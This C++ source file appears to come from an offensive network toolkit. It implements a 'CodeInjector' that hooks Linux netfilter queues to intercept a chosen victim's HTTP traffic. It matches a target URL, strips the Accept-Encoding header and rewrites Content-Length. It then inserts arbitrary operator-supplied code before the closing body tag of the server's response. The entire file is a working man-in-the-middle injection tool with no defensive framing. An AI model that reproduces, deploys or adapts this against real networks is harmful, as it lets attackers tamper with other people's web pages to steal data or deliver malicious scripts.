#include "CodeInjector.h"

#include <iostream>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip6.h>
#include <netinet/tcp.h>
#include <linux/netfilter.h>
#include <poll.h>
#include <cstring>

// network byte order
uint32_t clientAckNum{0}; 
uint32_t clientSeqNum{0};
uint32_t serverAckNum{0};
uint32_t serverSeqNum{0};

bool32 processRequest{TRUE};

/*
    filters for the http request that contains the url the user wishes to inject with js code. If a matching
    packet is found, the clientAckNum gets set and can later be used to filter for the matching response. clientSeqNum
    is also set.
*/
static bool32 FilterReq(const char* url, tcphdr* tcpHeader, char* payload, uint32_t payloadLen, uint32_t& clientAckNum)
{
    uint32_t res = PacketCraft::GetTCPDataProtocol((TCPHeader*)tcpHeader); // TODO: is this a safe cast?
    if(res == PC_HTTP_REQUEST)
    {
        if(PacketCraft::GetHTTPMethod((uint8_t*)payload) == PC_HTTP_GET)
        {
            char packetFileName[FQDN_MAX_STR_LEN]{};
            char packetDomainName[FQDN_MAX_STR_LEN]{};
            char packetFullURL[1024]{};

            char* buffer = (char*)malloc(payloadLen + 1);
            memset(buffer, '\0', payloadLen + 1);
            memcpy(buffer, payload, payloadLen);
            // convert to uppercase because it is case-insensitive
            for(unsigned int i = 0; i < payloadLen; ++i)
            {
                if(buffer[i] > 96 && buffer[i] < 123)
                    buffer[i] = std::toupper(buffer[i]);
            }

            // Find filename. Should be something like this: "GET /test/file.php HTTP/1.1" NOTE: this is case-sensitive
            int filePathStartIndex = PacketCraft::FindInStr(payload, "GET ") + 4;
            int filePathEndIndex = PacketCraft::FindInStr(payload, " HTTP");
            if(filePathStartIndex == -1 || filePathEndIndex == -1)
            {
                free(buffer);
                return FALSE;
            }

            memcpy(packetFileName, payload + filePathStartIndex, filePathEndIndex - filePathStartIndex);
            packetFileName[filePathEndIndex] = '\0';

            // Find host portion. Should be something like this: "Host: example.test.com"
            // NOTE: this is case-insensitive, TODO: find out if there is always a space after the 'Host:' 
            int domainStartIndex = PacketCraft::FindInStr(buffer, "HOST: ") + 6;
            int domainEndIndex = PacketCraft::FindInStr(buffer + domainStartIndex, "\r\n") + domainStartIndex;
            if(domainStartIndex == -1 || domainEndIndex == -1)
            {
                free(buffer);
                return FALSE;
            }

            memcpy(packetDomainName, payload + domainStartIndex, domainEndIndex - domainStartIndex);
            packetDomainName[domainEndIndex] = '\0';

            PacketCraft::ConcatStr(packetFullURL, sizeof(packetFullURL), packetDomainName, packetFileName);
            if(packetFullURL[PacketCraft::GetStrLen(packetFullURL) - 1] == '/')
                packetFullURL[PacketCraft::GetStrLen(packetFullURL) - 1] = '\0';

            // make sure the url in the received packet matches the url the user wants to inject
            if(PacketCraft::CompareStr(packetFullURL, url) == TRUE)
            {
                // save the ack num of the request. this is later used to filter for the correct response
                clientAckNum = tcpHeader->ack_seq;
                clientSeqNum = tcpHeader->seq;
                free(buffer);
                return TRUE;
            }
            free(buffer);
        }
    }
    return FALSE;
}

static int RemoveEncoding(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint32_t payloadLen)
{
    char* buffer = (char*)malloc(payloadLen);
    memcpy(buffer, payload, payloadLen);

    // convert to upper case because http header fields are not case sensitive
    for(unsigned int i = 0; i < payloadLen; ++i)
    {
        if(buffer[i] > 96 && buffer[i] < 123)
            buffer[i] = std::toupper(buffer[i]);
    }

    int matchStartIndex = PacketCraft::FindInStr(buffer, "ACCEPT-ENCODING: ");
    if(matchStartIndex == -1) // if there is no encoding, we don't have to edit the packet
    {   
        free(buffer);
        return NO_ERROR;
    }

    int matchEndIndex = PacketCraft::FindInStr(buffer + matchStartIndex, "\r\n") + matchStartIndex + 2;
    int matchLen = matchEndIndex - matchStartIndex;

    // we keep the payload size of the edited packet the same as the original so that we don't have to mangle
    // the ack/seq nums of the following packets (not sure if this is necessary TODO: find out)
    memset(buffer, '\0', payloadLen);
    memcpy(buffer, payload, matchStartIndex);
    memcpy(buffer + matchStartIndex, payload + matchEndIndex, payloadLen - matchEndIndex);
    if(ipVersion == AF_INET)
    {
        if(nfq_tcp_mangle_ipv4(pkBuff, 0, payloadLen, buffer, payloadLen) < 0)
        {
            free(buffer);
            LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_mangle_ipv4() error");
            return APPLICATION_ERROR;
        }
    }
    else // NOTE: NOT TESTED!
    {
        if(nfq_tcp_mangle_ipv6(pkBuff, matchStartIndex, matchLen, "", 0) < 0)
        {
            free(buffer);
            LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_mangle_ipv6() error");
            return APPLICATION_ERROR;
        }
    }

    free(buffer);
    return NO_ERROR;

}

static int InjectNewContentLen(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint32_t payloadLen, 
    CHaks::NetFilterCallbackData* callbackData)
{
    uint32_t bufferLen = payloadLen + 1;
    char* buffer = (char*)malloc(bufferLen);
    memset(buffer, '\0', bufferLen);
    memcpy(buffer, payload, payloadLen);

    // convert to uppercase because it is case-insensitive
    for(unsigned int i = 0; i < payloadLen; ++i)
    {
        if(buffer[i] > 96 && buffer[i] < 123)
            buffer[i] = std::toupper(buffer[i]);
    }

    int contentLengthStartIndex = PacketCraft::FindInStr(buffer, "CONTENT-LENGTH: ") + 16;
    int contentLengthEndIndex = PacketCraft::FindInStr(buffer + contentLengthStartIndex, "\r\n") + contentLengthStartIndex;
    int contentLenStrSize = contentLengthEndIndex - contentLengthStartIndex;

    int contentLen = atoi(buffer + contentLengthStartIndex);
    if(contentLen <= 0)
    {
        LOG_ERROR(APPLICATION_ERROR, "atoi() error");
        free(buffer);
        return APPLICATION_ERROR;
    }
    int newContentLen = contentLen + callbackData->codeLen;
    std::cout << "changing content length from " << contentLen << " to " << newContentLen << "\n";

    char newContentLenStr[64]{};
    snprintf(newContentLenStr, 64, "%d", newContentLen);
    int newContentLenStrLen = PacketCraft::GetStrLen(newContentLenStr);

    if(ipVersion == AF_INET)
    {
        if(nfq_tcp_mangle_ipv4(pkBuff, contentLengthStartIndex, contentLenStrSize, newContentLenStr, newContentLenStrLen) < 0)
        {
            free(buffer);
            LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_mangle_ipv4() error");
            return APPLICATION_ERROR;
        }
    }
    else // NOTE: NOT TESTED!
    {
        if(nfq_tcp_mangle_ipv6(pkBuff, contentLengthStartIndex, contentLenStrSize, newContentLenStr, newContentLenStrLen) < 0)
        {
            free(buffer);
            LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_mangle_ipv6() error");
            return APPLICATION_ERROR;
        }
    }

    free(buffer);
    return NO_ERROR;
}

/*
    returns 0 when code is succesfully injected, 1 if no body tag is found and no code is injected, -1 on error
*/
static int InjectCode(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint32_t payloadLen, 
    CHaks::NetFilterCallbackData* callbackData)
{
    uint32_t bufferLen = payloadLen + callbackData->codeLen + 1;
    char* buffer = (char*)malloc(bufferLen);
    memset(buffer, '\0', bufferLen);
    memcpy(buffer, payload, payloadLen);

    // convert to uppercase because it is case-insensitive
    for(unsigned int i = 0; i < payloadLen; ++i)
    {
        if(buffer[i] > 96 && buffer[i] < 123)
            buffer[i] = std::toupper(buffer[i]);
    }

    int codeStartIndex = PacketCraft::FindInStr(buffer, "</BODY>");
    if(codeStartIndex == -1)
    {
        free(buffer);
        return 1;
    }

    std::cout << "mangling...\n";

    if(ipVersion == AF_INET)
    {
        if(nfq_tcp_mangle_ipv4(pkBuff, codeStartIndex, 0, callbackData->code, callbackData->codeLen) < 0)
        {
            free(buffer);
            LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_mangle_ipv4() error");
            return -1;
        }
    }
    else // NOTE: NOT TESTED!
    {
        if(nfq_tcp_mangle_ipv6(pkBuff, codeStartIndex, 0, callbackData->code, callbackData->codeLen) < 0)
        {
            free(buffer);
            LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_mangle_ipv6() error");
            return -1;
        }
    }

    free(buffer);
    return 0;
}

 static int nfq_send_verdict(int queue_num, uint32_t id, mnl_socket* nl, pkt_buff* pkBuff, int verdict = NF_ACCEPT)
 {
    char buf[MNL_SOCKET_BUFFER_SIZE];
    nlmsghdr* nlh;
    nlattr* nest;

    nlh = nfq_nlmsg_put(buf, NFQNL_MSG_VERDICT, queue_num);

    if(pktb_mangled(pkBuff))
    {
        std::cout << "packet was mangled" << std::endl;
        nfq_nlmsg_verdict_put_pkt(nlh, pktb_data(pkBuff), pktb_len(pkBuff));
    }

    nfq_nlmsg_verdict_put(nlh, id, verdict);

    /* example to set the connmark. First, start NFQA_CT section: */
    nest = mnl_attr_nest_start(nlh, NFQA_CT);

    /* then, add the connmark attribute: */
    mnl_attr_put_u32(nlh, CTA_MARK, htonl(42));
    /* more conntrack attributes, e.g. CTA_LABELS could be set here */

    /* end conntrack section */
    mnl_attr_nest_end(nlh, nest);

    if(mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) 
    {
        LOG_ERROR(APPLICATION_ERROR, "mnl_socket_sendto() error");
        return APPLICATION_ERROR;
    }

    return NO_ERROR;
 }

 // returns -1 on error, 1 when packet does not match criteria, 0 when the correct packet is found and processed
 int ProcessRequest(uint32_t ipVersion, iphdr* ipv4Header, ip6_hdr* ipv6Header,  tcphdr* tcpHeader, char* tcpPayload, 
    uint32_t tcpPayloadLen, CHaks::NetFilterCallbackData* callbackData)
 {
    // Filter for a matching IP
    if(ipVersion == AF_INET)
    {
        sockaddr_in targetAddr{};
        if(inet_pton(AF_INET, callbackData->targetIPStr, &targetAddr.sin_addr) != 1)
        {
            LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
            return -1;
        } 

        if(targetAddr.sin_addr.s_addr != ipv4Header->saddr)
            return 1;
    }
    else if(ipVersion == AF_INET6)
    {
        sockaddr_in6 targetAddr{};
        if(inet_pton(AF_INET6, callbackData->targetIPStr, &targetAddr.sin6_addr) != 1)
        {
            LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
            return -1;
        }

        if(memcmp(targetAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_src.__in6_u.__u6_addr8, IPV6_ALEN) != 0)
            return 1;
    }
    //////////

    if(FilterReq(callbackData->url, tcpHeader, (char*)tcpPayload, tcpPayloadLen, clientAckNum) == TRUE)
    {
        std::cout << "request filtered\n";
        if(ipVersion == AF_INET)
        {
            if(inet_ntop(AF_INET, &ipv4Header->daddr, callbackData->serverIPStr, INET_ADDRSTRLEN) == nullptr)
            {
                LOG_ERROR(APPLICATION_ERROR, "inet_ntop() error");
                return -1;
            }
        }
        else
        {
            if(inet_ntop(AF_INET6, &ipv6Header->ip6_dst, callbackData->serverIPStr, INET6_ADDRSTRLEN) == nullptr)
            {
                LOG_ERROR(APPLICATION_ERROR, "inet_ntop() error");
                return -1;
            }
        }

        return 0;
    }

    return 1;
 }

// returns 0 if traffic of the correct tcp flow is coming from the client, 1 if it's coming from the server, and 2
// if neither. returns - 1 on error. global client and server ack/seq nums are also set
static int FilterIPAndTCP(uint32_t ipVersion, iphdr* ipv4Header, ip6_hdr* ipv6Header, tcphdr* tcpHeader, 
    CHaks::NetFilterCallbackData* callbackData)
{
    // Filter for a matching client packet based on IP
    if(ipVersion == AF_INET)
    {
        sockaddr_in targetAddr{};
        if(inet_pton(AF_INET, callbackData->targetIPStr, &targetAddr.sin_addr) != 1)
        {
            LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
            return -1;
        }

        sockaddr_in serverAddr{};
        if(inet_pton(AF_INET, callbackData->serverIPStr, &serverAddr.sin_addr) != 1)
        {
            LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
            return -1; 
        }

        // check if traffic is coming from the desired target client
        if(targetAddr.sin_addr.s_addr == ipv4Header->saddr && serverAddr.sin_addr.s_addr == ipv4Header->daddr)
        {
            if(tcpHeader->seq == serverAckNum)
            {
                clientAckNum = tcpHeader->ack_seq;
                clientSeqNum = tcpHeader->seq;
                return 0;
            }
        }
        // check if traffic is coming from the server
        else if(targetAddr.sin_addr.s_addr == ipv4Header->daddr && serverAddr.sin_addr.s_addr == ipv4Header->saddr)
        {
            if(tcpHeader->seq == clientAckNum)
            {
                serverAckNum = tcpHeader->ack_seq;
                serverSeqNum = tcpHeader->seq;
                return 1;
            }
        }
    }
    else if(ipVersion == AF_INET6)
    {
        sockaddr_in6 targetAddr{};
        if(inet_pton(AF_INET6, callbackData->targetIPStr, &targetAddr.sin6_addr) != 1)
        {
            LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
            return -1;
        }

        sockaddr_in6 serverAddr{};
        if(inet_pton(AF_INET6, callbackData->serverIPStr, &serverAddr.sin6_addr) != 1)
        {
            LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
            return -1;
        }

        // check if traffic is coming from the desired target client
        if((memcmp(targetAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_src.__in6_u.__u6_addr8, IPV6_ALEN) == 0) && 
            (memcmp(serverAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_dst.__in6_u.__u6_addr8, IPV6_ALEN) == 0))
        {
            if(tcpHeader->seq == serverAckNum)
            {
                clientAckNum = tcpHeader->ack_seq;
                clientSeqNum = tcpHeader->seq;
                return 0;
            }
        }
        // check if traffic is coming from the server
        else if((memcmp(targetAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_dst.__in6_u.__u6_addr8, IPV6_ALEN) == 0) && 
                (memcmp(serverAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_src.__in6_u.__u6_addr8, IPV6_ALEN) == 0))
        {
            if(tcpHeader->seq == clientAckNum)
            {
                serverAckNum = tcpHeader->ack_seq;
                serverSeqNum = tcpHeader->seq;
                return 1;
            }
        }
    }
    //////////
    /////////////////////////////////////////////////////////////////

    return 2;
}

static int queueCallback(const nlmsghdr *nlh, void *data)
{
    nfqnl_msg_packet_hdr* ph{nullptr};
    nlattr* attr[NFQA_MAX + 1]{};
    nfgenmsg*nfg{nullptr};

    CHaks::NetFilterCallbackData* callbackData = (CHaks::NetFilterCallbackData*)data;

    if(nfq_nlmsg_parse(nlh, attr) < 0) 
    {
        LOG_ERROR(APPLICATION_ERROR, "nfq_nlmsg_parse() error");
        return MNL_CB_ERROR;
    }

    nfg = (nfgenmsg*)mnl_nlmsg_get_payload(nlh);
    if(nfg == nullptr)
    {
        LOG_ERROR(APPLICATION_ERROR, "mnl_nlmsg_get_payload() error");
        return MNL_CB_ERROR;
    }

    if(attr[NFQA_PACKET_HDR] == NULL) 
    {
        LOG_ERROR(APPLICATION_ERROR, "metaheader not set");
        return MNL_CB_ERROR;
    }

    ph = (nfqnl_msg_packet_hdr*)mnl_attr_get_payload(attr[NFQA_PACKET_HDR]);
    if(ph == nullptr)
    {
        LOG_ERROR(APPLICATION_ERROR, "mnl_attr_get_payload() NFQA_PACKET_HDR error");
        return MNL_CB_ERROR;
    }

    uint16_t plen{0};
    uint8_t* payload{nullptr};

    plen = mnl_attr_get_payload_len(attr[NFQA_PAYLOAD]);
    payload = (uint8_t*)mnl_attr_get_payload(attr[NFQA_PAYLOAD]);
    if(payload == nullptr)
    {
        LOG_ERROR(APPLICATION_ERROR, "mnl_attr_get_payload() NFQA_PAYLOAD error");
        return MNL_CB_ERROR;
    }

    // TODO: we need to check that this matches with the ip the user provided in command line arguments
    uint32_t ipVersion{};
    if(ntohs(ph->hw_protocol) == ETH_P_IP)
        ipVersion = AF_INET;
    else if(ntohs(ph->hw_protocol) == ETH_P_IPV6)
        ipVersion = AF_INET6;
    else
    {
        LOG_ERROR(APPLICATION_ERROR, "unknown hw_protocol");
        return MNL_CB_ERROR;
    }

    pkt_buff* pkBuff = pktb_alloc(ipVersion, payload, plen, 4'096);
    if(pkBuff == nullptr)
    {
        LOG_ERROR(APPLICATION_ERROR, "pktb_alloc() error");
        return MNL_CB_ERROR;
    }

    iphdr* ipv4Header{nullptr};
    ip6_hdr* ipv6Header{nullptr};
    tcphdr* tcpHeader{nullptr};

    bool32 hasTCPLayer{FALSE};

    // Get IP header and set transport layer
    if(ipVersion == AF_INET)
    {
        ipv4Header = nfq_ip_get_hdr(pkBuff);
        if(ipv4Header == nullptr)
        {
            LOG_ERROR(APPLICATION_ERROR, "nfq_ip_get_hdr() error");
            return MNL_CB_ERROR;
        }

        if(nfq_ip_set_transport_header(pkBuff, ipv4Header) < 0)
        {
            LOG_ERROR(APPLICATION_ERROR, "nfq_ip_set_transport_header() error");
            return MNL_CB_ERROR;
        }

        if(ipv4Header->protocol == IPPROTO_TCP)
            hasTCPLayer = TRUE;
        else
            hasTCPLayer = FALSE;
    }
    else if(ipVersion == AF_INET6)
    {
        ipv6Header = nfq_ip6_get_hdr(pkBuff);
        if(ipv6Header == nullptr)
        {
            LOG_ERROR(APPLICATION_ERROR, "nfq_ip6_get_hdr()");
            return MNL_CB_ERROR;
        }

        int res = nfq_ip6_set_transport_header(pkBuff, ipv6Header, IPPROTO_TCP);
        if(res == 1)
            hasTCPLayer = TRUE;
        else
            hasTCPLayer = FALSE;
    }
    //////////

    // any packet that has no tcp layer will be allowed through
    if(hasTCPLayer == FALSE)
    {
        if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData->nl, pkBuff) == APPLICATION_ERROR)
        {
            LOG_ERROR(APPLICATION_ERROR, "nfq_send_verdict() error");
            return MNL_CB_ERROR;
        }

        return MNL_CB_OK;
    }

    // get the tcp header
    tcpHeader = nfq_tcp_get_hdr(pkBuff);
    if(tcpHeader == nullptr)
    {
        LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_get_hdr");
        return -1;
    }

    void *tcpPayload = nfq_tcp_get_payload(tcpHeader, pkBuff);
    if(tcpPayload == nullptr)
    {
        LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_get_payload() error");
        return -1;
    }

    unsigned int tcpPayloadLen = nfq_tcp_get_payload_len(tcpHeader, pkBuff);
    /////////

    // process the inital start of the communication, we are looking for a http request that contains the url that the user 
    // supplied in command line arguments
    if(processRequest == TRUE)
    {
        int res = ProcessRequest(ipVersion, ipv4Header, ipv6Header, tcpHeader, (char*)tcpPayload, tcpPayloadLen, callbackData);
        if(res == 0)
        {
            std::cout << "removing encoding...\n";
            if(RemoveEncoding(ipVersion, pkBuff, (char*)tcpPayload, tcpPayloadLen) == APPLICATION_ERROR)
            {
                pktb_free(pkBuff);
                LOG_ERROR(APPLICATION_ERROR, "RemoveEncoding() error");
                return MNL_CB_ERROR;
            }

            processRequest = FALSE;
            std::cout << "request processed succesfully, encoding removed and client ack and seq number set\n";
        }
        else if(res == -1)
        {
            pktb_free(pkBuff);
            LOG_ERROR(APPLICATION_ERROR, "ProcessRequest() error");
            return MNL_CB_ERROR;
        }
    }
    else
    {
        int res = FilterIPAndTCP(ipVersion, ipv4Header, ipv6Header, tcpHeader, callbackData);
        if(res == 1) // process server
        {
            std::cout << "\n----------\nserver packet belonging to the tcp flow found:\n";
            char printBuffer[IP_MAXPACKET]{};
            nfq_ip_snprintf(printBuffer, IP_MAXPACKET, ipv4Header);
            std::cout << "[IP]:\n" << printBuffer << "\n";
            memset(printBuffer, '\0', IP_MAXPACKET);
            nfq_tcp_snprintf(printBuffer, IP_MAXPACKET, tcpHeader);
            std::cout << "[TCP]:\n" << printBuffer << "\n";
            memset(printBuffer, '\0', IP_MAXPACKET);
            /*
            std::cout << "[PAYLOAD]:\n";
            if(tcpPayloadLen <= 0)
                std::cout << "(empty)\n";
            for(unsigned int i = 0; i < tcpPayloadLen; ++i)
            {
                std::cout << ((char*)tcpPayload)[i];
            }
            std::cout << "\n";
            */
            std::cout << "payload len: " << tcpPayloadLen << "\n";
            uint32_t proto = PacketCraft::GetTCPDataProtocol((TCPHeader*)tcpHeader); // TODO: is this a safe cast?
            std::cout << "tcp proto: " << PacketCraft::ProtoUint32ToStr(proto) << "\n";
            std::cout << "----------\n\n";

            if(tcpPayloadLen > 0)
            {
                if(proto == PC_HTTP_RESPONSE)
                {
                    static bool32 contentLenEdited{FALSE};
                    if(contentLenEdited == FALSE)
                    {
                        if(InjectNewContentLen(ipVersion, pkBuff, (char*)tcpPayload, tcpPayloadLen, callbackData) == APPLICATION_ERROR)
                        {
                            pktb_free(pkBuff);
                            LOG_ERROR(APPLICATION_ERROR, "RemoveEncoding() error");
                            return MNL_CB_ERROR;
                        }
                        std::cout << "Content-Length edited\n";
                        contentLenEdited = TRUE;
                    }
                    else
                    {
                        std::cout << "Injecting code...\n";
                        res = InjectCode(ipVersion, pkBuff, (char*)tcpPayload, tcpPayloadLen, callbackData);
                        if(res == -1)
                        {
                            pktb_free(pkBuff);
                            LOG_ERROR(APPLICATION_ERROR, "RemoveEncoding() error");
                            return MNL_CB_ERROR;
                        }
                        else if(res == 1)
                        {
                            std::cout << "no body tag found while injecting code\n";
                        }
                        else if(res == 0)
                        {
                            std::cout << "code injected\n";
                            contentLenEdited = FALSE;
                            processRequest = TRUE;
                        }
                    }
                }
            }
        }
        else if(res == 0)
        {
            // std::cout << "client packet belonging to the tcp flow processed\n";
        }
        else if(res == 2)
        {
            // std::cout << "packet not belonging to the tcp flow ignored\n";
        }
        else if(res == -1)
        {
            pktb_free(pkBuff);
            LOG_ERROR(APPLICATION_ERROR, "FilterIPAndTCP() error");
            return MNL_CB_ERROR;
        }
    }

    if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData->nl, pkBuff) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "nfq_send_verdict() error");
        return MNL_CB_ERROR;
    }

    return MNL_CB_OK;
}

CHaks::CodeInjector::CodeInjector() :
    queueNum(0),
    handler(nullptr),
    queue(nullptr)
{

}

CHaks::CodeInjector::~CodeInjector()
{
    if(queue != nullptr)
        nfq_destroy_queue(queue);

    if(handler != nullptr)
        nfq_close(handler);
}

int CHaks::CodeInjector::Init(const uint32_t ipVersion, const char* interfaceName, const char* targetIP, int queueNum,
    const char* url, const char* injectCode, int injectCodeLen)
{
    this->queueNum = queueNum;

    callbackData.ipVersion = ipVersion;
    callbackData.targetIPStr = targetIP;
    callbackData.interfaceName = interfaceName;
    callbackData.url = url;
    callbackData.code = injectCode;
    callbackData.codeLen = injectCodeLen;

    return NO_ERROR;
}

int CHaks::CodeInjector::Run()
{
    char* buffer{nullptr};
    nlmsghdr* nlh{nullptr};
    /* largest possible packet payload, plus netlink data overhead: */
    size_t bufferSize = 0xffff + (MNL_SOCKET_BUFFER_SIZE/2);
    int res;

    callbackData.nl = mnl_socket_open(NETLINK_NETFILTER);
    if(callbackData.nl == nullptr)
    {
        LOG_ERROR(APPLICATION_ERROR, "mnl_socket_open() error");
        return APPLICATION_ERROR;
    }

    if(mnl_socket_bind(callbackData.nl, 0, MNL_SOCKET_AUTOPID) < 0) 
    {
        mnl_socket_close(callbackData.nl);
        LOG_ERROR(APPLICATION_ERROR, "mnl_socket_bind() error");
        return APPLICATION_ERROR;
    }

    portId = mnl_socket_get_portid(callbackData.nl);

    buffer = (char*)malloc(bufferSize);
    if(!buffer) 
    {
        mnl_socket_close(callbackData.nl);
        LOG_ERROR(APPLICATION_ERROR, "malloc() error");
        return APPLICATION_ERROR;
    }

    nlh = nfq_nlmsg_put(buffer, NFQNL_MSG_CONFIG, queueNum);
    if(nlh == nullptr)
    {
        mnl_socket_close(callbackData.nl);
        free(buffer);
        LOG_ERROR(APPLICATION_ERROR, "nfq_nlmsg_put() error");
        return APPLICATION_ERROR;
    }

    nfq_nlmsg_cfg_put_cmd(nlh, callbackData.ipVersion, NFQNL_CFG_CMD_BIND);

    if(mnl_socket_sendto(callbackData.nl, nlh, nlh->nlmsg_len) < 0) 
    {
        mnl_socket_close(callbackData.nl);
        free(buffer);
        LOG_ERROR(APPLICATION_ERROR, "mnl_socket_sendto() error");
        return APPLICATION_ERROR;
    }
 
    nlh = nfq_nlmsg_put(buffer, NFQNL_MSG_CONFIG, queueNum);
    if(nlh == nullptr)
    {
        mnl_socket_close(callbackData.nl);
        free(buffer);
        LOG_ERROR(APPLICATION_ERROR, "nfq_nlmsg_put() error");
        return APPLICATION_ERROR;
    }

    nfq_nlmsg_cfg_put_params(nlh, NFQNL_COPY_PACKET, IP_MAXPACKET);
    mnl_attr_put_u32(nlh, NFQA_CFG_FLAGS, htonl(NFQA_CFG_F_GSO));
    mnl_attr_put_u32(nlh, NFQA_CFG_MASK, htonl(NFQA_CFG_F_GSO));

    if(mnl_socket_sendto(callbackData.nl, nlh, nlh->nlmsg_len) < 0) 
    {
        mnl_socket_close(callbackData.nl);
        free(buffer);
        LOG_ERROR(APPLICATION_ERROR, "mnl_socket_sendto() error");
        return APPLICATION_ERROR;
    }

    /* ENOBUFS is signalled to userspace when packets were lost
    * on kernel side.  In most cases, userspace isn't interested
    * in this information, so turn it off.
    */
    res = 1;
    mnl_socket_setsockopt(callbackData.nl, NETLINK_NO_ENOBUFS, &res, sizeof(int));

    pollfd pollFds[2]{-1, -1};
    pollFds[0].fd = 0;
    pollFds[0].events = POLLIN;
    pollFds[1].fd = mnl_socket_get_fd(callbackData.nl);
    pollFds[1].events = POLLIN;

    while(true)
    {
        int nEvents = poll(pollFds, sizeof(pollFds) / sizeof(pollFds[0]), -1);
        if(nEvents == -1)
        {
            mnl_socket_close(callbackData.nl);
            free(buffer);
            LOG_ERROR(APPLICATION_ERROR, "poll() error");
            return APPLICATION_ERROR;
        }
        else if(pollFds[1].revents & POLLIN) // we have a packet in the queue
        {
            res = mnl_socket_recvfrom(callbackData.nl, buffer, bufferSize);
            if (res == -1) 
            {
                mnl_socket_close(callbackData.nl);
                free(buffer);
                LOG_ERROR(APPLICATION_ERROR, "mnl_socket_recvfrom() error");
                return APPLICATION_ERROR;
            }

            res = mnl_cb_run(buffer, res, 0, portId, queueCallback, &callbackData);
            if (res < 0)
            {
                mnl_socket_close(callbackData.nl);
                free(buffer);
                LOG_ERROR(APPLICATION_ERROR, "mnl_cb_run() error");
                return APPLICATION_ERROR;
            }
        }
        else if(pollFds[0].revents & POLLIN) // user hit a key and wants to quit program
        {
            break;
        }
        else
        {
            mnl_socket_close(callbackData.nl);
            free(buffer);
            LOG_ERROR(APPLICATION_ERROR, "unknown poll() error!");
            return APPLICATION_ERROR;
        }

    }

    mnl_socket_close(callbackData.nl);
    free(buffer);
    return NO_ERROR;
}